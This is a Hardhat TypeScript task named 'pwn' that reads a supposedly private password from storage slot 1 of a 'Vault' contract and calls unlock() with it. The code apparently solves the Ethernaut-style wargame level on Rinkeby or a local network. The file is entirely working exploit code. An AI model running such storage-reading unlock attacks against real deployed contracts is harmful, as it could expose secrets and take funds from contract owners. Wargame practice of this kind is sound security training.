import { task } from 'hardhat/config';
import { ContractReceipt, ContractTransaction, utils } from 'ethers';
import { Vault } from '../../typechain';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/dist/src/signer-with-address';
import { TASK_PWN } from '../task-names';
import { Network } from '@ethersproject/networks/lib/types';

import vaultAbi from '../../data/abi/Vault.json';

task(TASK_PWN, 'Break this contract')
  .setAction(async (_taskArgs, hre) => {

    const wallets: SignerWithAddress[] = await hre.ethers.getSigners();
    const userWallet = wallets[1];

    const address = await userWallet.getAddress();
    console.log(`user address: ${address}`);

    const network: Network = await hre.ethers.provider.getNetwork();
    console.log(`network: ${network.name}`);
    
    let vaultContractAddress = '';
    if (network.name === 'rinkeby') {
      vaultContractAddress = process.env.RINKEBY_VAULT_CONTRACT_ADDRESS || '';
    } else if (network.name === 'unknown') { //localhost network
      vaultContractAddress = process.env.LOCALHOST_VAULT_CONTRACT_ADDRESS || '';
    }
    console.log(`contractAddress: ${vaultContractAddress}`);

    const vaultContract: Vault = new hre.ethers.Contract(vaultContractAddress, vaultAbi, userWallet) as Vault;

    // is locked
    let locked = await vaultContract.locked();
    console.log(`Locked: ${locked}`);

    const passwordFromContractStorage = await hre.ethers.provider.getStorageAt(vaultContract.address, 1);

    const tx: ContractTransaction = await vaultContract.connect(userWallet).unlock(passwordFromContractStorage);
    const contractReceipt: ContractReceipt = await tx.wait();
    if (contractReceipt.status === 1) {
      console.log("Unlock Successful");
    } else {
      console.log('Unlock Failed');
    }

    // is unlocked
    locked = await vaultContract.locked();
    console.log(`Locked: ${locked}`);

    process.exit(0)
  });